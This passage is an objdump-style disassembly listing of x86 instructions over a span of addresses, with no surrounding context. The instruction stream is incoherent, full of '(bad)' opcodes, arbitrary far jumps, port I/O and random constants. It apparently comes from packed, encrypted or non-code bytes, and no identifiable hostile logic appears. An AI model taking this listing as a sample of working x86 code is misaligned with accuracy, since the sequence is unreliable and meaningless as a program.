  428d3b:	pop    ds
  428d3c:	retf   0x56b2
  428d3f:	adc    al,bl
  428d41:	xchg   edx,eax
  428d42:	imul   edx,DWORD PTR [esi+0x19fed34c],0xffffff94
  428d49:	push   esi
  428d4a:	(bad)  
  428d4b:	shl    DWORD PTR fs:[ecx*2-0x7601fcbd],cl
  428d53:	push   es
  428d54:	mov    eax,0x34d34d0d
  428d59:	jg     0x428d15
  428d5b:	add    BYTE PTR [esi+0x8],cl
  428d5e:	add    BYTE PTR [eax-0xd8008bb],dh
  428d64:	jnp    0x428cec
  428d66:	mov    DWORD PTR [eax],0xac9c7b2e
  428d6c:	scas   eax,DWORD PTR es:[edi]
  428d6d:	out    0xd8,al
  428d6f:	and    ebp,DWORD PTR [ebx-0x4d]
  428d72:	hlt    
  428d73:	push   edx
  428d74:	or     cl,BYTE PTR [edx]
  428d76:	repz sbb BYTE PTR [esi-0x2],ah
  428d7a:	sub    BYTE PTR [edx+0x7],0x2
  428d7e:	ss in  al,dx
  428d80:	inc    edx
  428d81:	test   DWORD PTR [esi+edi*2-0x19710784],ecx
  428d88:	or     eax,0xbf7a3e2f
  428d8d:	add    ah,dh
  428d8f:	in     al,dx
  428d90:	jbe    0x428d46
  428d92:	add    al,dh
  428d94:	jb     0x428d6e
  428d96:	dec    edi
  428d97:	inc    edx
  428d98:	shl    DWORD PTR [esi-0x5f91d114],0x1e
  428d9f:	lods   al,BYTE PTR ds:[esi]
  428da0:	aam    0xe7
  428da2:	adc    BYTE PTR [ebx+eax*2+0x45],dh
  428da6:	loopne 0x428da9
  428da8:	sub    BYTE PTR ds:0x6b5a3b36,dh
  428dae:	sub    ah,ah
  428db0:	pop    es
  428db1:	cwde   
  428db2:	test   DWORD PTR [ebx+eax*1+0x70],esp
  428db6:	xchg   ecx,eax
  428db7:	scas   al,BYTE PTR es:[edi]
  428db8:	movups xmm5,xmm6
  428dbb:	cwde   
  428dbc:	fisub  DWORD PTR [esi+edx*1+0x28]
  428dc0:	or     edx,DWORD PTR [esi+ebx*4]
  428dc3:	pop    ss
  428dc4:	mov    ds:0x81ac9a16,al
  428dc9:	ja     0x428d70
  428dcb:	cs call 0x4e65:0x734301f
  428dd3:	es fs cdq 
  428dd6:	stos   BYTE PTR es:[edi],al
  428dd7:	push   eax
  428dd8:	in     al,dx
  428dd9:	push   0x26
  428ddb:	clc    
  428ddc:	retf   0xdc5e
  428ddf:	sbb    bh,ch
  428de1:	mov    ah,0xcd
  428de4:	jbe    0x428e1b
  428de6:	outs   dx,DWORD PTR ds:[esi]
  428de7:	adc    cl,0xcd
  428dea:	add    BYTE PTR [edx],ah
  428dec:	sbb    BYTE PTR [ebx+esi*2+0x16],0x4
  428df1:	(bad)  
  428df2:	cmc    
  428df3:	add    BYTE PTR [esi+0x34],dh
  428df6:	or     eax,0xae6b4ab0
  428dfb:	vpunpckhbw xmm0,xmm4,XMMWORD PTR [ebp-0x21]
  428e01:	and    al,0xc1
  428e03:	in     al,dx
  428e04:	dec    edi
  428e05:	xchg   esp,eax
  428e06:	aad    0x45
  428e08:	jnp    0x428e4d
  428e0a:	and    DWORD PTR [eax],0x5426da9c
  428e10:	pop    edi
  428e11:	add    BYTE PTR [esi+0x2db250e8],dl
  428e17:	push   eax
  428e18:	in     eax,dx
  428e19:	jp     0x428e0d
  428e1b:	xor    BYTE PTR [eax],al
  428e1d:	dec    esp
  428e1e:	sbb    cl,dh
  428e20:	and    esi,ebx
  428e22:	test   BYTE PTR [ebp+0x24],dl
  428e25:	jo     0x428e74
  428e27:	push   ebp
  428e28:	adc    eax,0x2b9c4838
  428e2d:	pushf  
  428e2e:	mov    eax,ds:0xd15e0044
  428e33:	push   esi
  428e34:	and    BYTE PTR [esi-0x5cffeafa],0xf8
  428e3b:	outs   dx,DWORD PTR ds:[esi]
  428e3c:	pop    eax
  428e3d:	aad    0x8a
  428e3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428e40:	es pop eax
  428e42:	pop    esi
  428e43:	sub    cl,BYTE PTR [edx]
  428e45:	xor    edx,esi
  428e47:	mov    al,0x0
  428e49:	nop
  428e4a:	dec    eax
  428e4b:	adc    ebp,eax
  428e4d:	sub    BYTE PTR [eax],dh
  428e4f:	xchg   esi,eax
  428e50:	xchg   ebp,eax
  428e51:	mov    bl,BYTE PTR [ebp+0x14]
  428e54:	mov    ch,0x6f
  428e56:	mov    ds:0x9a3826a8,eax
  428e5b:	jl     0x428eb4
  428e5d:	enter  0x6067,0x1a
  428e61:	push   ss
  428e62:	jne    0x428ea6
  428e64:	lods   al,BYTE PTR ds:[esi]
  428e65:	add    al,dl
  428e67:	pop    ecx
  428e68:	repnz dec esp
  428e6a:	dec    esi
  428e6b:	pop    ecx
  428e6c:	add    DWORD PTR [ecx+0x78],edx
  428e6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428e70:	lock into 
  428e72:	jl     0x428e26
  428e74:	fisttp DWORD PTR [esi-0x4fdfba73]
  428e7a:	mov    WORD PTR [eax+0x46],gs
  428e7d:	mov    cl,al
  428e7f:	and    ebp,DWORD PTR [eax]
  428e81:	xchg   edx,edx
  428e83:	and    BYTE PTR [esi],0x4
  428e86:	pop    ss
  428e87:	shl    bh,cl
  428e89:	arpl   WORD PTR [esi],bp
  428e8b:	fdiv   QWORD PTR ds:0x60820d19
  428e91:	test   BYTE PTR [esi+0x7195ae28],0x41
  428e98:	mov    al,ds:0x36551ca0
  428e9d:	nop
  428e9e:	jp     0x428e5e
  428ea0:	xchg   ecx,eax
  428ea1:	adc    dl,bl
  428ea3:	aad    0xfc
  428ea5:	ds cwde 
  428ea7:	mov    WORD PTR [esi+0x16f65650],es
  428ead:	test   BYTE PTR [ebp-0x77],cl
  428eb0:	mov    dl,0x0
  428eb2:	xor    BYTE PTR [esi+esi*8],bl
  428eb5:	mov    ebp,DWORD PTR [eax]
  428eb7:	sar    DWORD PTR [esi+0x70ca3475],cl
  428ebd:	add    BYTE PTR [eax+0x78],cl
  428ec0:	add    dh,al
  428ec2:	jl     0x428ec4
  428ec4:	fild   WORD PTR [eax]
  428ec6:	fiadd  DWORD PTR [edx+eax*1-0xc]
  428eca:	jmp    0xa9bc:0xd82ffea8
  428ed1:	sbb    BYTE PTR [esi+esi*2-0x36],0x7c
  428ed6:	add    BYTE PTR [eax-0x2a],bl
  428ed9:	ja     0x428e8f
  428edb:	push   ss
  428edc:	add    dl,dl
  428ede:	jb     0x428f27
  428ee0:	xchg   ecx,eax
  428ee1:	dec    edx
  428ee2:	xor    dl,BYTE PTR [edx]
  428ee4:	add    ch,BYTE PTR [eax+ebx*1-0x48]
  428ee8:	push   0x45
  428eea:	inc    ecx
  428eeb:	jmp    0x7e4b:0xe6dc685a
  428ef2:	inc    esp
  428ef3:	add    BYTE PTR ds:0x2a6a2f35,ch
  428ef9:	sbb    BYTE PTR [esi+0xe868aa6],bl
  428eff:	inc    eax
  428f00:	add    BYTE PTR [ebp+0x50227869],cl
  428f06:	sub    al,0x30
  428f08:	pop    ebp
  428f09:	repnz repz test BYTE PTR [ebx],bl
  428f0d:	push   0x2679f028
  428f12:	ror    eax,0xd1
  428f15:	in     al,0x86
  428f17:	add    al,0x30
  428f19:	fmul   QWORD PTR [edx]
  428f1b:	(bad)  
  428f1d:	adc    DWORD PTR [ebp+0x55],0x8d816dc
  428f24:	mov    eax,0x2acd6d28
  428f29:	repnz pop ds
  428f2b:	sub    BYTE PTR [esi-0x3366a798],bh
  428f31:	repz mov ds:0xa6aeea06,al
  428f37:	icebp  
  428f38:	cmp    BYTE PTR [edx],cl
  428f3a:	fadd   DWORD PTR [eax]
  428f3c:	mov    cl,0x15
  428f3e:	pop    esp
  428f3f:	mov    cl,0x79
  428f41:	aaa    
  428f42:	loopne 0x428f44
  428f44:	shr    DWORD PTR [edi+eax*4],1
  428f47:	xchg   esp,eax
  428f48:	xchg   ebx,eax
  428f49:	add    BYTE PTR [ecx],ah
  428f4b:	push   esp
  428f4c:	outs   dx,DWORD PTR ds:[esi]
  428f4d:	rcr    ah,1
  428f4f:	inc    esi
  428f50:	pop    ebx
  428f51:	push   es
  428f52:	pop    esi
  428f53:	jbe    0x428ee7
  428f55:	sbb    al,0x73
  428f57:	mov    ds:0x74d1d8e6,al
  428f5c:	cmp    BYTE PTR [eax+0x705a827c],dl
  428f62:	push   esp
  428f63:	sub    al,0x82
  428f65:	shl    DWORD PTR es:[esi+0x38299433],1
  428f6c:	xchg   BYTE PTR [ebp+eax*4-0x55e7c888],ch
  428f73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428f74:	inc    edi
  428f75:	les    esi,FWORD PTR [esi-0x14]
  428f78:	or     dh,dl
  428f7a:	jge    0x428f7c
  428f7c:	fwait
  428f7d:	lea    ecx,[esi]
  428f7f:	ret    
  428f80:	dec    ecx
  428f81:	(bad)  
  428f82:	ficom  DWORD PTR [eax+0x65a656]
  428f88:	mov    ah,0x8e
  428f8a:	sub    al,bl
  428f8c:	push   ebx
  428f8d:	out    0x80,eax
  428f8f:	scas   al,BYTE PTR es:[edi]
  428f90:	pusha  
  428f91:	push   esp
  428f92:	loopne 0x428f98
  428f94:	add    DWORD PTR [eax+0x56604de9],ebp
  428f9a:	mov    eax,0xa5005423
  428f9f:	mov    al,ds:0xa6b21927
  428fa4:	jmp    0x428f3e
  428fa6:	xchg   edi,eax
  428fa7:	dec    BYTE PTR [edx+edx*4+0x5e]
  428fab:	push   eax
  428fac:	test   eax,0x8df6b8a9
  428fb1:	add    ch,al
  428fb3:	xchg   esp,eax
  428fb4:	leave  
  428fb5:	push   es
  428fb6:	(bad)  
  428fb7:	in     eax,dx
  428fb8:	add    eax,0x127ee868
  428fbd:	je     0x428f8e
  428fbf:	rcr    BYTE PTR [eax],1
  428fc1:	mov    eax,ds:0x550a3000
  428fc6:	add    BYTE PTR [edi+0x35d21d88],cl
  428fcc:	sbb    bh,BYTE PTR [esi]
  428fce:	xchg   BYTE PTR [eax-0x33],dh
  428fd1:	pop    ss
  428fd2:	mov    ch,0x2b
  428fd4:	adc    al,BYTE PTR [edx-0x61bbfff0]
  428fda:	outs   dx,BYTE PTR ds:[esi]
  428fdb:	add    BYTE PTR [ecx+edi*2],bl
  428fde:	dec    ecx
  428fdf:	add    edx,DWORD PTR [ecx-0x2f]
  428fe2:	sbb    al,0x18
  428fe4:	and    bl,ch
  428fe6:	or     bl,BYTE PTR [ebx+0x26]
  428fe9:	jp     0x429001
  428feb:	sub    cl,BYTE PTR [ecx]
  428fed:	and    BYTE PTR [esi-0x76],dh
  428ff0:	mov    WORD PTR [ecx+0x53],es
  428ff3:	imul   ebp,DWORD PTR [eax-0x76a916f4],0xffffffd0
  428ffa:	popf   
  428ffb:	lods   al,BYTE PTR ds:[esi]
  428ffc:	push   esi
  428ffd:	inc    edx
  428ffe:	scas   al,BYTE PTR es:[edi]
  428fff:	imul   esp,DWORD PTR [eax+0x41],0x69
  429003:	mov    edx,0xf35a42ef
  429008:	or     BYTE PTR [edx],cl
  42900a:	or     BYTE PTR [ebx+edx*8],dh
  42900d:	jne    0x42907e
  42900f:	fdiv   st(2),st
  429011:	jns    0x428fd1
  429013:	pop    ebx
  429014:	push   esi
  429015:	adc    eax,0xd6f88934
  42901a:	inc    edi
  42901b:	in     al,0x7
  42901d:	pusha  
  42901e:	and    DWORD PTR ds:0x4fd7000,edi
  429024:	push   es
  429025:	loope  0x429030
  429027:	outs   dx,BYTE PTR ds:[esi]
  429028:	outs   dx,DWORD PTR ds:[esi]
  429029:	push   0x96a0502a
  42902e:	mov    ds:0xb614bfe2,eax
  429033:	retf   
  429034:	add    BYTE PTR [esi+0x3556c8ad],ch
  42903a:	mov    al,0x72
  42903c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42903d:	cli    
  42903e:	hlt    
  42903f:	(bad)  
  429040:	test   eax,0x93962cb2
  429045:	push   0x45
  429047:	cwde   
  429048:	les    edi,FWORD PTR [ebp+edx*1+0x3c]
  42904c:	cmc    
  42904d:	sub    al,0xa0
  42904f:	cmp    BYTE PTR [eax+0x64],0x40
  429053:	retf   
  429054:	fsub   st,st(1)
  429056:	pop    eax
  429057:	ror    BYTE PTR [edx-0xc],1
  42905a:	nop
  42905b:	and    ch,BYTE PTR [esi+ebx*8+0x42]
  42905f:	cmc    
  429060:	jmp    0x429017
  429062:	dec    ebp
  429063:	shl    eax,cl
  429065:	push   es
  429066:	es mov dh,0xe0
  429069:	aaa    
  42906a:	leave  
  42906b:	mov    cs,WORD PTR [ebx-0x78]
  42906e:	adc    al,0xf6
  429070:	push   0x7ad6eb10
  429075:	loopne 0x429033
  429077:	mov    dl,0x41
  429079:	gs sub al,0xfe
  42907c:	or     dh,al
  42907e:	or     al,bh
  429080:	add    bh,dh
  429082:	jmp    0xf1d3888
  429087:	cld    
  429088:	mov    edx,0x6bec0410
  42908d:	or     eax,0x3016b61d
  429092:	mov    ?,esp
  429094:	jmp    0x5824:0xfa51c866
  42909b:	cmp    cl,BYTE PTR [edx-0x6155a8a6]
  4290a1:	sbb    DWORD PTR [eax-0x75e13751],esp
  4290a7:	mov    al,ds:0x9ad509b1
  4290ac:	push   ss
  4290ad:	adc    edx,DWORD PTR [esi]
  4290af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4290b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4290b1:	sar    BYTE PTR [esi+0x60d55af6],1
  4290b7:	pop    esi
  4290b8:	inc    esi
  4290b9:	je     0x4290bb
  4290bb:	mov    ebx,0x18b408f2
  4290c0:	pop    es
  4290c1:	jl     0x429065
  4290c3:	stos   BYTE PTR es:[edi],al
  4290c4:	loope  0x42908f
  4290c6:	je     0x4290d4
  4290c8:	in     al,dx
  4290c9:	ret    0x719c
  4290cc:	ret    0xabb0
  4290cf:	mov    ds:0x766cc7b2,eax
  4290d4:	ret    0xec8
  4290d7:	xor    BYTE PTR [ebx+0x51],al
  4290da:	sub    BYTE PTR [esi-0x34],0xa
  4290de:	ror    BYTE PTR [eax+0x2b41600a],1
  4290e4:	stos   DWORD PTR es:[edi],eax
  4290e5:	pusha  
  4290e6:	gs ja  0x42914b
  4290e9:	dec    esi
  4290ea:	fcomp  QWORD PTR [esi]
  4290ec:	xchg   DWORD PTR [ebx+0x0],ecx
  4290ef:	sbb    eax,DWORD PTR [ebx-0x2543e527]
  4290f5:	dec    edx
  4290f6:	push   0xffffffaa
  4290f8:	push   0x4d
  4290fa:	(bad)  
  4290fc:	loop   0x42914c
  4290fe:	dec    esi
  4290ff:	rcr    BYTE PTR [ebx+eax*2],1
  429102:	imul   ebx,DWORD PTR [edx-0x2a01165a],0xcb5dce40
  42910c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42910d:	imul   ebx,DWORD PTR [edx+0x57c45aa6],0xa6b55cc1
  429117:	stc    
  429118:	fwait
  429119:	xor    ah,BYTE PTR [ecx+0x423700c4]
  42911f:	add    BYTE PTR [esi-0x24d70ec8],ah
  429125:	cli    
  429126:	ins    BYTE PTR es:[edi],dx
  429127:	in     al,dx
  429128:	mov    al,0xb2
  42912a:	pop    edx
  42912b:	aaa    
  42912c:	pop    ebp
  42912d:	bound  ebp,QWORD PTR [edx]
  42912f:	add    al,0xe6
  429131:	sub    DWORD PTR [ebp-0x4a],ecx
  429134:	sub    DWORD PTR [edx+ebp*8+0x25db8e8],esp
  42913b:	lods   al,BYTE PTR ds:[esi]
  42913c:	adc    BYTE PTR [ecx-0x18],ah
  42913f:	call   0xe3da9eac
  429144:	fsub   QWORD PTR [ebp+0x2a]
  429147:	out    0x54,eax
  429149:	imul   ebx,DWORD PTR [edx],0x9aaa6b50
  42914f:	jmp    0x42917f
  429151:	ins    DWORD PTR es:[edi],dx
  429152:	call   0x9a87:0x79b48eef
  429159:	cmp    al,0xc3
  42915b:	xchg   ebx,eax
  42915c:	add    BYTE PTR [edx],ch
  42915e:	sar    cl,0x26
  429161:	int    0x20
  429163:	add    cl,BYTE PTR [edx+0x74ace6ba]
  429169:	retf   0x680a
  42916c:	cmp    BYTE PTR [esi+0x5b],al
  42916f:	test   al,0x45
  429171:	push   esi
  429172:	xor    al,0x6f
  429174:	xor    al,0xcf
  429176:	loopne 0x4291c3
  429178:	jecxz  0x42919e
  42917a:	in     eax,dx
  42917b:	push   0x4966c9b6
  429180:	inc    edi
  429181:	shr    BYTE PTR [esi-0x28],1
  429184:	mov    cl,BYTE PTR [edx]
  429186:	not    bl
  429188:	rcl    BYTE PTR [ecx+0x59],1
  42918b:	lods   al,BYTE PTR ds:[esi]
  42918c:	jbe    0x42915b
  42918e:	pop    edx
  42918f:	jnp    0x429132
  429191:	push   esp
  429192:	pop    esi
  429193:	pop    ecx
  429194:	push   ebx
  429195:	lods   al,BYTE PTR ds:[esi]
  429196:	dec    esp
  429197:	mov    eax,0x6140c46e
  42919c:	rol    esp,1
  42919e:	sub    BYTE PTR [ebp+0x4c],0xef
  4291a2:	dec    edx
  4291a3:	mov    eax,0xcc697086
  4291a8:	rol    BYTE PTR [ebx],1
  4291aa:	jne    0x429158
  4291ac:	push   eax
  4291ad:	adc    bl,dh
  4291af:	ss xor al,0xef
  4291b2:	pop    edx
  4291b3:	ror    DWORD PTR [edi+edi*8+0x7c],1
  4291b7:	jge    0x429235
  4291b9:	(bad)  
  4291ba:	pop    ecx
  4291bb:	add    BYTE PTR [ecx+0x7b],bh
  4291be:	and    al,0x57
  4291c0:	xchg   ebx,eax
  4291c1:	jns    0x429196
  4291c3:	push   es
  4291c4:	pop    edi
  4291c5:	add    BYTE PTR [ecx+0x328d3a3d],al
  4291cb:	test   al,0x79
  4291cd:	inc    ecx
  4291ce:	push   ebp
  4291cf:	or     esp,DWORD PTR [ecx+ecx*4]
  4291d2:	jle    0x4291eb
  4291d4:	dec    eax
  4291d5:	add    BYTE PTR [ebp+0x4d056513],dl
  4291db:	push   es
  4291dc:	pop    edx
  4291dd:	jbe    0x4291fe
  4291df:	(bad)  
  4291e0:	popf   
  4291e1:	dec    esp
  4291e2:	popa   
  4291e3:	sub    ebp,DWORD PTR [eax+0x36]
  4291e6:	pop    eax
  4291e7:	cdq    
  4291e8:	jle    0x429211
  4291ea:	jo     0x429191
  4291ec:	push   ds
  4291ed:	das    
  4291ee:	clc    
  4291ef:	xor    bh,BYTE PTR [esi+0x18]
  4291f2:	mov    eax,ds:0x7ead9a15
  4291f7:	sub    edi,DWORD PTR [ebp+0x0]
  4291fa:	test   eax,0x36a0baaa
  4291ff:	aaa    
  429200:	pusha  
  429201:	add    BYTE PTR [ebx],dh
  429203:	inc    edx
  429204:	mov    cl,0xed
  429206:	sub    BYTE PTR [eax],ch
  429208:	test   al,0x36
  42920a:	aas    
  42920b:	add    BYTE PTR [ebp-0x465dc410],bh
  429211:	or     eax,DWORD PTR [ecx]
  429213:	jbe    0x4291fd
  429215:	dec    esp
  429216:	retf   0x43c6
  429219:	(bad)  
  42921a:	push   ss
  42921b:	xor    al,BYTE PTR ds:0xd0ed4c2b
  429221:	int    0xe0
  429223:	test   BYTE PTR [ebp+0x28dc0b4c],al
  429229:	out    0x57,al
  42922b:	(bad)  
  42922c:	fcom   DWORD PTR [ebx-0x65]
  42922f:	xchg   esp,eax
  429230:	xor    al,0x45
  429232:	sbb    eax,0x44963a04
  429237:	hlt    
  429238:	xchg   ecx,eax
  429239:	shl    ebp,1
  42923b:	add    BYTE PTR [ebp+0x4],dl
  42923e:	repz mov ah,ch
  429241:	and    BYTE PTR [ebx-0x2f],0xe
  429245:	pop    es
  429246:	push   esp
  429247:	(bad)  
  429248:	loope  0x4291ea
  42924a:	mov    ds:0xa280c8ed,al
  42924f:	mov    ds,WORD PTR [edi+0x50]
  429252:	lods   eax,DWORD PTR ds:[esi]
  429253:	cmp    al,0x77
  429255:	mov    ch,0x84
  429257:	xlat   BYTE PTR ds:[ebx]
  429258:	dec    edx
  429259:	out    0x5d,al
  42925b:	pop    ebp
  42925c:	or     eax,0x7fb0f1f8
  429261:	push   esi
  429262:	std    
  429263:	mov    eax,ds:0xd71d7b00
  429268:	les    ecx,FWORD PTR [edx-0x678ad07]
  42926e:	push   ss
  42926f:	and    DWORD PTR [eax+0x1],0xffffffd5
  429273:	mov    ch,0xb4
  429275:	loope  0x429255
  429277:	add    BYTE PTR [edi+0x5ed50d68],cl
  42927d:	or     DWORD PTR [edx+0x16],ebx
  429280:	mov    al,ds:0xa0975379
  429285:	adc    eax,0x119300cf
  42928a:	sub    BYTE PTR [edi+0x3c7018eb],bl
  429290:	es jmp 0x5b44:0xa72ee9b
  429298:	xchg   ecx,eax
  429299:	es ds and eax,0xaad4a3ca
  4292a0:	sub    ch,BYTE PTR [edi-0x74a71c53]
  4292a6:	sub    al,0x2d
  4292a8:	std    
  4292a9:	inc    edx
  4292aa:	sub    edx,ebp
  4292ac:	mov    bh,0x88
  4292ae:	xor    eax,0x6f35aa42
  4292b3:	xchg   esp,eax
  4292b4:	mov    bl,0xde
  4292b6:	add    BYTE PTR [ecx],dh
  4292b8:	mov    edi,0xd3fc3d46
  4292bd:	xor    al,0x14
  4292bf:	sbb    ah,dl
  4292c1:	idiv   dh
  4292c3:	das    
  4292c4:	or     eax,0x4d34099f
  4292c9:	sub    cl,BYTE PTR [eax]
  4292cb:	and    eax,0x4d20cbc6
  4292d0:	shl    DWORD PTR [ecx*1+0x113302fe],cl
  4292d7:	ss adc al,0x1b
  4292da:	pop    edx
  4292db:	lods   eax,DWORD PTR ds:[esi]
  4292dc:	xor    BYTE PTR [esi],ch
  4292de:	pop    ecx
  4292df:	jo     0x429278
  4292e1:	pop    ebp
  4292e2:	sub    al,0xf5
  4292e4:	pop    eax
  4292e5:	call   0xe9ec:0xf20c1a9a
  4292ec:	jl     0x429353
  4292ee:	hlt    
  4292ef:	in     al,dx
  4292f0:	popa   
  4292f1:	fwait
  4292f2:	sub    ch,BYTE PTR [edx-0xf7789b8]
  4292f8:	lods   al,BYTE PTR ds:[esi]
  4292f9:	jb     0x42933e
  4292fb:	push   ss
  4292fc:	adc    BYTE PTR [edi],bl
  4292fe:	ficom  DWORD PTR [eax+0x2e]
  429301:	outs   dx,BYTE PTR ds:[esi]
  429302:	in     al,dx
  429303:	call   0xd127174f
  429308:	mov    al,ds:0x4cbc9a00
  42930d:	loopne 0x42931b
  42930f:	in     al,dx
  429310:	sbb    al,0x78
  429312:	ror    BYTE PTR [esi],0x13
  429315:	in     al,0xd8
  429317:	sbb    BYTE PTR [ebx],dh
  429319:	pushf  
  42931a:	adc    al,0x68
  42931c:	xchg   ebx,eax
  42931d:	inc    ecx
  42931e:	call   0xe2a92935
  429323:	xchg   edx,eax
  429324:	sub    eax,DWORD PTR [eax+ebp*8]
  429327:	push   edx
  429328:	xor    DWORD PTR [eax+eiz*8-0x72],0xffffffec
  42932d:	aas    
  42932e:	jo     0x429371
  429330:	xor    ebp,DWORD PTR [edi+0x32044cda]
  429336:	mov    ah,0x40
  429338:	add    BYTE PTR [eax],al
  42933a:	xor    eax,0x740c3c7c
  42933f:	pop    esp
  429340:	bound  eax,QWORD PTR [ebx-0x42]
  429343:	in     al,dx
  429344:	cmp    BYTE PTR [ebx],cl
  429346:	test   BYTE PTR [esp+edi*1],dh
  429349:	mov    dh,0xa8
  42934b:	ds add al,bl
  42934e:	xor    BYTE PTR [ecx],al
  429350:	repnz sub al,0x1c
  429353:	push   ds
  429354:	push   ss
  429355:	or     al,BYTE PTR ds:0x9628ec34
  42935b:	gs xor eax,0xe2f8af34
  429361:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429362:	out    dx,al
  429363:	and    BYTE PTR ds:0xe05ca200,bl
  429369:	fidiv  WORD PTR [esp+esi*1]
  42936c:	je     0x4293a3
  42936e:	mov    ds,WORD PTR [eax-0x2c]
  429371:	fidivr DWORD PTR [esp+edx*2+0x6cc1d602]
  429378:	fmul   QWORD PTR [eax-0x34]
  42937b:	jmp    0xbc8f6580
  429380:	ret    0xa02c
  429383:	loopne 0x429353
  429385:	and    ch,BYTE PTR [esi]
  429387:	retf   0x9d
  42938a:	inc    esp
  42938b:	xchg   ecx,eax
  42938c:	adc    ch,BYTE PTR [edx-0x22]
  42938f:	(bad)  
  429390:	nop
  429391:	add    BYTE PTR [eax-0x3e],al
  429394:	dec    esi
  429395:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429396:	mov    edx,0xfe436aa9
  42939b:	in     al,dx
  42939c:	js     0x429359
  42939e:	mov    ch,BYTE PTR [ecx-0x9ff49e4]
  4293a4:	stos   BYTE PTR es:[edi],al
  4293a5:	mov    eax,0xb11282aa
  4293aa:	jle    0x42934f
  4293ac:	add    BYTE PTR [esi+ebp*1-0x12],ch
  4293b0:	xor    eax,DWORD PTR [ebp-0x6b]
  4293b3:	push   0xb51268f4
  4293b8:	stos   BYTE PTR es:[edi],al
  4293b9:	stos   BYTE PTR es:[edi],al
  4293ba:	dec    esp
  4293bb:	fcom   st(0)
  4293bd:	in     eax,0x52
  4293bf:	pusha  
  4293c0:	mov    esp,0x1ed49cf2
  4293c5:	ret    0x86c6
  4293c8:	jg     0x4293cb
  4293ca:	clc    
  4293cb:	sbb    al,cl
  4293cd:	add    BYTE PTR [edx+edi*2+0xa4dcc16],dl
  4293d4:	add    BYTE PTR [edi],dl
  4293d6:	mov    ds:0xe280a12,al
  4293db:	out    0x15,al
  4293dd:	or     eax,0xc262d6ae
  4293e2:	or     ch,dh
  4293e4:	test   dl,dl
  4293e6:	add    BYTE PTR [esi],al
  4293e8:	add    ebp,DWORD PTR [ecx+0x45]
  4293eb:	repz adc ch,0x0
  4293ef:	add    bh,BYTE PTR [edx+eiz*1+0x5e4da3e]
  4293f6:	iret   
  4293f7:	rol    BYTE PTR [edx-0x191cb747],cl
  4293fd:	dec    edx
  4293fe:	and    BYTE PTR [eax],al
  429400:	(bad)  [ebp+0x5]
  429403:	scas   al,BYTE PTR es:[edi]
  429404:	or     eax,0x98ae7180
  429409:	and    al,0x37
  42940b:	push   0x2b
  42940d:	stos   DWORD PTR es:[edi],eax
  42940e:	dec    eax
  42940f:	push   ebp
  429410:	or     eax,0xbb4e4886
  429415:	(bad)  
  429416:	sti    
  429417:	mov    al,0x36
  429419:	push   ecx
  42941a:	addr16 pop dx
  42941d:	(bad)  
  42941e:	repz xchg ebp,eax
  429420:	aad    0x50
  429422:	loope  0x429450
  429424:	rcr    al,1
  429426:	mov    WORD PTR [esi-0x6b2bb6f6],cs
  42942c:	rcl    cl,0xb2
  42942f:	imul   ebx,DWORD PTR cs:[esi+0x6cd8023c],0x6c2ad33c
  42943a:	fs push ss
  42943c:	push   ebp
  42943d:	sub    DWORD PTR [esi-0x2e],esi
  429440:	sub    eax,0xec06c4a6
  429445:	sbb    dl,BYTE PTR [ebx-0x23]
  429448:	jae    0x42948b
  42944a:	dec    edi
  42944b:	add    ch,BYTE PTR [esi+0x1cb86c14]
  429451:	test   eax,0xc0374050
  429456:	pushf  
  429457:	(bad)  
  429458:	fisubr DWORD PTR [edx-0x40]
  42945b:	or     eax,ecx
  42945d:	cmp    al,0x6
  42945f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429460:	jns    0x429455
  429462:	xchg   BYTE PTR [edi],bl
  429464:	(bad)  
  429465:	sbb    al,0x0
  429467:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429468:	adc    bl,BYTE PTR [ecx]
  42946a:	add    al,al
  42946c:	adc    eax,0x69a69a1a
  429471:	call   0x9766:0x996b9868
  429478:	cmp    DWORD PTR [edx-0x679e965a],ebx
  42947e:	jl     0x429407
  429480:	nop
  429481:	lods   eax,DWORD PTR ds:[esi]
  429482:	int    0x9b
  429484:	pop    ss
  429485:	into   
  429486:	sub    DWORD PTR [edx],edi
  429488:	add    BYTE PTR [ebx-0xb],dl
  42948b:	add    BYTE PTR cs:[ebx],cl
  42948e:	cwde   
  42948f:	jnp    0x429455
  429491:	push   es
  429492:	shl    esi,cl
  429494:	push   ds
  429495:	(bad)  
  429496:	mov    ds,ecx
  429498:	mov    dl,0xb8
  42949a:	sahf   
  42949b:	xor    al,0x4a
  42949d:	icebp  
  42949e:	and    DWORD PTR [eax+edi*4],ebp
  4294a1:	cmp    al,0x77
  4294a3:	add    BYTE PTR [ecx-0x174a599a],ah
  4294a9:	(bad)  
  4294ab:	pop    edx
  4294ac:	sar    BYTE PTR [ebx],1
  4294ae:	psubb  mm3,QWORD PTR [ecx]
  4294b1:	repnz addr16 aad 0x70
  4294b5:	pop    ecx
  4294b6:	lods   eax,DWORD PTR ds:[esi]
  4294b7:	inc    esp
  4294b8:	xchg   DWORD PTR [eax+eax*2+0x1e],ecx
  4294bc:	sub    ch,0x6e
  4294bf:	or     DWORD PTR [esi+0x50],ebx
  4294c2:	push   esp
  4294c3:	xor    al,0x3c
  4294c5:	test   al,0x54
  4294c7:	fisub  WORD PTR [edi+edi*1-0x7f]
  4294cb:	jp     0x429487
  4294cd:	adc    ch,bl
  4294cf:	jo     0x429483
  4294d1:	adc    ah,ah
  4294d3:	add    BYTE PTR [ebx+0x68ac4cf6],bl
  4294d9:	hlt    
  4294da:	mov    es,WORD PTR [ebp-0x65d5615e]
  4294e0:	fs jge 0x429533
  4294e3:	shl    DWORD PTR [esi],0x28
  4294e6:	dec    eax
  4294e7:	push   0x2fcd25e6
  4294ec:	sub    al,ch
  4294ee:	js     0x429562
  4294f0:	push   ebx
  4294f1:	pop    ebp
  4294f2:	(bad)  
  4294f3:	lock push esp
  4294f5:	pop    ebx
  4294f6:	test   BYTE PTR [edx+0x0],al
  4294f9:	jnp    0x4294e5
  4294fb:	gs mov edi,0x8d00cda0
